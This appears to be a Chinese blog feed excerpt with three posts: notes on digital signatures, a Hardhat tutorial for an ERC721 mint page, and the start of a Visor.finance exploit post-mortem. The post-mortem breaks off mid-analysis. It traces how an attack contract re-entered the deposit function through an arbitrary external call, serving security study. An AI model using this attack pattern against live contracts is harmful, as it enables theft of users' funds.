    <content type="html"><![CDATA[<ul><li><p><strong>数字签名的计算方法：</strong><br>  算出内容的 hash 值，然后用私钥加密，这就是数字签名；<br>  用户收到信息后，用公钥解密数字签名得到 hash 值，与原内容的hash值进行比较。</p></li><li><p><strong>作用：</strong></p><ol><li> 不可抵赖：如果公钥能解密，则内容一定是与该公钥对应的私钥加密而来，即可证明来源。</li><li>数据完整性：数字签名的HASH值和自己计算出的HASH值一致，即可证明该内容是完整的未经修改过。<br>但是数字签名不能确保”公钥”的真实性，第三方可偷换”公钥”，达到与伪服务器通信的目的。</li></ol></li><li><p><strong>数字证书</strong><br>  由权威证书中心颁发用来证明公钥的真实性。</p></li><li><p><strong>数字签名的过程：</strong><br>  现有通信双方 A,B，俩者之间使用俩套非对称加密机制，现在A向B发送消息<br>  <img src="/image/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D.assets/image-20220415231317783.png" alt="image-20220415231317783"><br>  存在问题：如果在发送过程中有人修改了秘文的消息，B拿到的秘文就并非是A所发送的，所以需要数字签名解决俩个问题：</p><pre><code>  1⃣️A的身份认证  2⃣️A发送的消息完整性</code></pre><p>  <img src="/image/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D.assets/image-20220415231328262.png" alt="image-20220415231328262"><br>  A：将明文进行摘要运算后得到摘要（消息完整性），再将摘要用A的私钥加密（身份认证），得到数字签名，将密文和数字签名一块发给B。<br>  B：收到A的消息后，先将密文用自己的私钥解密，得到明文。将数字签名用A的公钥进行解密后，得到正确的摘要（解密成功说明A的身份被认证了)。</p><p>  对明文进行摘要运算，得到实际收到的摘要，将两份摘要进行对比，如果一致，说明消息没有被篡改（消息完整性）。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;数字签名的计算方法：&lt;/strong&gt;&lt;br&gt;  算出内容的 hash 值，然后用私钥加密，这就是数字签名；&lt;br&gt;  用户收到信息后，用公钥解密数字签名得到 hash 值，与原内容的hash值进行比较。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="密码学" scheme="https://banana69.site/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="数字签名" scheme="https://banana69.site/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>Hardhat 基本操作</title>
    <link href="https://banana69.site/2022/04/17/hardhat%20%E4%BD%BF%E7%94%A8/"/>
    <id>https://banana69.site/2022/04/17/hardhat%20%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:49:37.907Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Hardhat 是一个用于编译、部署、测试和调试以太坊软件的开发环境。它可以帮助开发人员管理和自动化构建智能合约和 dApp 过程中固有的重复性任务，并围绕此工作流程轻松引入更多功能。这意味着在核心上编译、运行和测试智能合约。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ol><li><p>初始化 hardhat 项目：<code>npx hardhat</code></p></li><li><p>项目结构为：</p><ul><li><p><code>contracts/</code>是合约所在的位置。</p></li><li><p><code>test/</code>是测试文件的位置。</p></li><li><p><code>scripts/</code>是部署脚本的位置。</p></li></ul></li><li><p>编译合约：<code>npx hardhat compile</code></p><p>当一个项目中有不同版本的合约文件时可以在 <code>hardhat.config.js</code>中配置编译器的版本，有以下俩种方式：</p><ul><li><p>配置不同的版本号</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">compilers</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.5.5&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.6.7&quot;</span>,</span><br><span class="line">        <span class="attr">settings</span>: &#123;&#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样配置可以使合约中不同的文件应用于不同的编译器</p></li><li><p>根据文件进行配置</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">compilers</span>: [...],</span><br><span class="line">    <span class="attr">overrides</span>: &#123;</span><br><span class="line">      <span class="string">&quot;contracts/Foo.sol&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.5.5&quot;</span>,</span><br><span class="line">        <span class="attr">settings</span>: &#123; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将合约编译器的版本号指定到不同的文件</p></li></ul></li><li><p>测试合约：<code>npx hardhat test</code></p><p>例：针对以下这份合约编写简单的测试文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Greeter.sol</span><br><span class="line">//SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Greeter &#123;</span><br><span class="line">    string private greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting) &#123;</span><br><span class="line">        console.log(&quot;Deploying a Greeter with greeting:&quot;, _greeting);</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        console.log(&quot;Changing greeting from &#x27;%s&#x27; to &#x27;%s&#x27;&quot;, greeting, _greeting);</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写测试文件使用 Waffle 库，它是一个编写和测试智能合约的库，使用<code>ether.js</code>。我们在这里使用<code>chai</code>，它是一个断言库。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>);</span><br></pre></td></tr></table></figure><p>在封装器中的 <code>it</code> 的回调函数中使用了<code>async</code>，与以太坊网络和智能合约的交互是异步操作，因此大多数 API 和库使用 JavaScript 的 <code>promise</code> 来返回值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">describe(<span class="string">&quot;Greeter&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">&quot;Should return the new greeting once it&#x27;s changed&quot;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在 <code>ether.js</code>中， ContractFactory 是一个用于部署新合约的抽象，所以这里的 Greeter 是 Greeter 合约的工厂函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Greeter = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;Greeter&quot;</span>);</span><br></pre></td></tr></table></figure><p>在 ContractFactory 上调用 <code>deploy()</code>就会部署合约，并返回一个解析为 contract 的Promise，这是为智能合约的每个功能提供方法的对象，这里将 <code>Hello World!</code>作为参数传递给合约的构造函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> greeter = <span class="keyword">await</span> Greeter.deploy(<span class="string">&quot;Hello, world!&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用 <code>chai</code>库的匹配器<code>expect</code>，检查调用<code>greet()</code>方法时是否匹配<code>Hello, World!</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">expect(<span class="keyword">await</span> greeter.greet()).to.equal(<span class="string">&quot;Hello, world!&quot;</span>);</span><br></pre></td></tr></table></figure><p>以同样的方式调用合约方法，修改合约状态，调用<code>setGreeting</code>设置新的参数，在 promise 被解析后，我们执行另一个断言来判断状态是否改变</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> greeter.setGreeting(<span class="string">&quot;Hola, mundo!&quot;</span>);</span><br><span class="line">expect(<span class="keyword">await</span> greeter.greet()).to.equal(<span class="string">&quot;Hola, mundo!&quot;</span>);</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="/image/hardhat_init.assets/image-20220417130632372.png" alt="image-20220417130632372"></p></li><li><p>部署合约： <code>npx hardhat run scripts/deploy.js</code></p><p>使用 js 脚本来部署合约项目，如下代码为从实例项目部署合约</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// We get the contract to deploy</span></span><br><span class="line">  <span class="keyword">const</span> Greeter = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;Greeter&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> greeter = <span class="keyword">await</span> Greeter.deploy(<span class="string">&quot;Hello, Hardhat!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> greeter.deployed();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;Greeter deployed to:&quot;</span>, greeter.address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .then(<span class="function">() =&gt;</span> process.exit(<span class="number">0</span>))</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></li><li><p>启动本地节点：<code>npx hardhat node</code></p></li><li><p>在 localhost 中部署智能合约：<code>npx hardhat run --network localhost scripts/deploy.js</code></p></li></ol><h3 id="使用-hardhat-构建一个简单的-web3-mint-页面"><a href="#使用-hardhat-构建一个简单的-web3-mint-页面" class="headerlink" title="使用 hardhat 构建一个简单的 web3 mint 页面"></a>使用 hardhat 构建一个简单的 web3 mint 页面</h3><h5 id="0x01-初始化项目"><a href="#0x01-初始化项目" class="headerlink" title="0x01 初始化项目"></a>0x01 初始化项目</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx create-react-app hardhat-react-1</span><br><span class="line">npx hardhat</span><br><span class="line">npm install @openzeppelin/contracts</span><br></pre></td></tr></table></figure><p>最终的项目结构：</p><p><img src="/image/hardhat_init.assets/image-20220417153740357.png" alt="image-20220417153740357"></p><h5 id="0x02-编译合约"><a href="#0x02-编译合约" class="headerlink" title="0x02 编译合约"></a>0x02 编译合约</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol&#x27;;</span><br><span class="line">import &#x27;@openzeppelin/contracts/utils/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract MintExample is ERC721Enumerable, Ownable&#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    constructor (</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol</span><br><span class="line">    ) ERC721(name, symbol) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function mint(uint256 numberOfMints) public payable &#123;</span><br><span class="line">        uint256 supply = totalSupply();</span><br><span class="line">        for(uint256 i; i &lt; numberOfMints; i++) &#123;</span><br><span class="line">            _safeMint(msg.sender, supply + 1);</span><br><span class="line">            balances[msg.sender]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约提供简单的 mint 功能，在合约编写完成后编译合约</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat compile</span><br></pre></td></tr></table></figure><p>在合约编译完成后在 artifacts/contracts 文件夹中存储合约的 ABI，在 src 文件夹下新建 <code>mintExampleAbi.json</code>，将合约的 ABI 复制到该文件中</p><p><img src="/image/hardhat_init.assets/image-20220417180403552.png" alt="image-20220417180403552"></p><h5 id="0x03-测试合约"><a href="#0x03-测试合约" class="headerlink" title="0x03 测试合约"></a>0x03 测试合约</h5><p>编写测试文件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line">describe(<span class="string">&quot;MintExample&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">&quot;Should return the mint balance&quot;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//signer表示以太坊账户对象，用于将交易发送到合约和其他账户，在这里获取所连接节点中的账户列表</span></span><br><span class="line">    <span class="comment">//hardhat network 节点只保留第一个账户</span></span><br><span class="line">    <span class="keyword">const</span> [owner] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">    <span class="comment">//ContractFactory 是用于部署新合约的抽象</span></span><br><span class="line">    <span class="keyword">const</span> MintExample = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;MintExample&quot;</span>);</span><br><span class="line">    <span class="comment">//将俩个参数传入构造函数，这里的 MintExample 是用来实例合约的工厂</span></span><br><span class="line">    <span class="keyword">const</span> mintExample = <span class="keyword">await</span> MintExample.deploy(<span class="string">&quot;MINT&quot;</span>, <span class="string">&quot;MINT&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用 owner 调用合约中的 mint 方法铸造一个 MINT</span></span><br><span class="line">    <span class="keyword">await</span> mintExample.connect(owner).mint(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//利用断言式来判断代币余额与铸造金额是否相等</span></span><br><span class="line">    expect(<span class="keyword">await</span> mintExample.balances(owner.address)).to.equal(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 hardhat 中测试合约</p><p><img src="/image/hardhat_init.assets/image-20220417181225491.png"></p><h5 id="0x05-部署合约"><a href="#0x05-部署合约" class="headerlink" title="0x05 部署合约"></a>0x05 部署合约</h5><p>当通过测试以后部署合约，首先需要启动 hardhat 节点</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p><img src="/image/hardhat_init.assets/image-20220417182940057.png" alt="image-20220417182940057"></p><p>编写部署脚本，将合约部署到 hardhat 网络，即部署到 localhost</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> MintExample = <span class="keyword">await</span> hre.ethers.getContractFactory(<span class="string">&quot;MintExample&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> mintExample = <span class="keyword">await</span> MintExample.deploy(<span class="string">&quot;Minter&quot;</span>, <span class="string">&quot;MINT&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> mintExample.deployed();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;MintExample deployed to:&quot;</span>, mintExample.address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .then(<span class="function">() =&gt;</span> process.exit(<span class="number">0</span>))</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat run scripts/sample-script.js --network localhost</span><br></pre></td></tr></table></figure><p>部署完成后会获取一个合约地址</p><p><img src="/image/hardhat_init.assets/image-20220417181744766.png" alt="image-20220417181744766"></p><h5 id="0x06-编写前端"><a href="#0x06-编写前端" class="headerlink" title="0x06 编写前端"></a>0x06 编写前端</h5><p>以下为<code>App.js</code>代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./App.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> mintExampleAbi <span class="keyword">from</span> <span class="string">&quot;./mintExampleAbi.json&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers, Bignumber &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useEffect, useState &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; use &#125; <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//合约部署的地址</span></span><br><span class="line"><span class="keyword">const</span> mintExampleAddress = <span class="string">&quot;0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//CONNECTING</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//当页面加载时这个变量是空的，当连接后从区块链获取信息时，使用状态可以更新</span></span><br><span class="line">  <span class="keyword">const</span> [accounts, setAccounts] = useState([]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这个函数会调用 metamask钱包</span></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">connectionAccounts</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//window.ethereum 会检查是否运行 metamask </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.ethereum) &#123;</span><br><span class="line">      <span class="keyword">const</span> accounts = <span class="keyword">await</span> <span class="built_in">window</span>.ethereum.request(&#123;<span class="attr">method</span>: <span class="string">&quot;eth_requestAccounts&quot;</span>&#125;);</span><br><span class="line">      setAccounts(accounts);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//当页面加载时调用一次 connectionAccounts 函数</span></span><br><span class="line">  useEffect(<span class="function">() =&gt;</span> &#123;connectionAccounts();&#125;,[]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// MINTING</span></span><br><span class="line">  <span class="keyword">const</span> [mintAmount, setMintAmount] = useState(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">handleMint</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.ethereum) &#123;</span><br><span class="line">      <span class="comment">// provider 是一种连接到区块链的特定方式</span></span><br><span class="line">      <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.Web3Provider(<span class="built_in">window</span>.ethereum);</span><br><span class="line">      <span class="comment">//定义一个 signer ，任何时候的交易涉及代币的交换或者任何具有财务价值的东西都必须签署签名</span></span><br><span class="line">      <span class="keyword">const</span> signer = provider.getSigner();</span><br><span class="line">      <span class="keyword">const</span> contract = <span class="keyword">new</span> ethers.Contract(mintExampleAddress, mintExampleAbi.abi, signer);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//将想要 mint 的数量作为参数传递给 mint</span></span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> contract.mint(mintAmount);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;response: &quot;</span>, response);</span><br><span class="line">      &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;error&quot;</span>, err);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is how you create a mint button<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">      &#123;accounts.length &amp;&amp; (</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setMintAmount(mintAmount - 1)&#125;&gt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            &#123;mintAmount&#125;</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setMintAmount(mintAmount + 1)&#125;&gt;+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleMint&#125;</span>&gt;</span>Mint<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">              Mint</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      )&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前端代码完成后在项目目录执行<code>npm run start</code></p><p><img src="/image/hardhat_init.assets/image-20220417183105333.png" alt="image-20220417183105333"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;Hardhat 是一个用于编译、部署、测试和调试以太坊软件的开发环境。它可以帮助开发人员管理和自动化构建智能合约和 dApp 过程中固有的重</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>从 Visor.finance 事件学习任意外部调用漏洞</title>
    <link href="https://banana69.site/2022/03/25/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/"/>
    <id>https://banana69.site/2022/03/25/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-25T04:42:54.000Z</published>
    <updated>2022-03-25T06:47:55.750Z</updated>
    
    <content type="html"><![CDATA[<h3 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h3><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320221429315.png" alt="image-20220320221429315"></p><p>首先查看攻击交易：</p><p><a href="https://etherscan.io/tx/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f">https://etherscan.io/tx/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f</a></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320221534097.png" alt="image-20220320221534097"></p><p>可以看到从0地址俩次转出大量的vVISR代币，由于<strong>0地址不会主动转账或者授权配额</strong>，所以可以猜测这些vVISR代币是mint出来的。</p><p>然后使用blocksec的交易分析工具分析，<a href="https://versatile.blocksecteam.com/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f%EF%BC%8C%E4%BD%BF%E7%94%A8">https://versatile.blocksecteam.com/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f，使用</a> invocation flow 功能可以查看调用关系，对其中的地址和函数进行查询找到标签，然后使用<code>customize account map</code>功能，将其替换为自定义标签，可以提高调用关系的可读性。</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320222843697.png" alt="image-20220320222843697"></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320222945110.png" alt="image-20220320222945110"></p><p>自定义后的标签为：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;0x0000000000000000000000000000000000000000&quot;</span>: <span class="string">&quot;Null Address: 0x000…000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0x8efab89b497b887cdaa2fb08ff71e4b3827774b2&quot;</span>: <span class="string">&quot;Visor Finance Exploiter&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0xf938424f7210f31df2aee3011291b658f872e91e&quot;</span>: <span class="string">&quot;Visor Finance: VISR Token&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;0xc9f27a50f82571c1c8423a42970613b8dbda14ef&quot;</span>: <span class="string">&quot;Visor Finance RewardsHypervisor&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0x3a84ad5d16adbe566baa6b3dafe39db3d5e261e5&quot;</span>: <span class="string">&quot;vVISR&quot;</span>,</span><br><span class="line"> <span class="attr">&quot;0x10c509aa9ab291c76c45414e7cdbd375e1d5ace8&quot;</span>: <span class="string">&quot;Exploit contract&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换标签后的调用关系图为：</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320223428363.png" alt="image-20220320223428363"></p><p>攻击步骤：</p><ol><li>攻击合约的<code>0x4a0b0c38</code>匿名函数调用了<code>Visor Finance RewardsHypervisor</code>合约中的<code>deposit</code>函数，把攻击合约的地址和攻击者的地址作为参数传入；</li><li>在调用<code>deposit</code>函数后，又回调了攻击合约的<code>owner，dekegatedTransferERC20</code>函数；</li><li>在<code>dekegatedTransferERC20</code>函数中重入到了<code>Visor Finance RewardsHypervisor</code>合约并且调用了<code>deposit</code>函数.</li></ol><p>在清楚了攻击流程之后可以推测出<code>RewardsHypervisor </code>合约的 <strong>deposit</strong> 函数内存在<strong>任意外部调用漏洞</strong>。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>查看<code>RewardsHypervisor</code> 合约的开源代码：</p><p><a href="https://etherscan.io/address/0xc9f27a50f82571c1c8423a42970613b8dbda14ef/advanced#code">https://etherscan.io/address/0xc9f27a50f82571c1c8423a42970613b8dbda14ef/advanced#code</a></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321080927216.png" alt="image-20220321080927216"></p><p>这段代码的逻辑是存入一定数量的<code>visr</code>就会mint出一定数量的<code>vvsir</code>给用户，<code>vvsir</code>为流动性代币，且函数 <code>deposit</code>为 external，可以被外部调用。</p><p>代码分析：</p><ol><li><p>参数<code>visrDeposit</code>为声明存入的<code>Visr</code>的数量；参数<code>from</code>为 visr 来源地址；参数<code>to</code>为 接受 vvsir 的地址；</p></li><li><p>返回值<code>share</code>为 <strong>mint</strong> 出的 vvsir 数量；</p></li><li><p>46-48行判断：存入的 <code>Visr</code>数量必须大于0，且不能讲 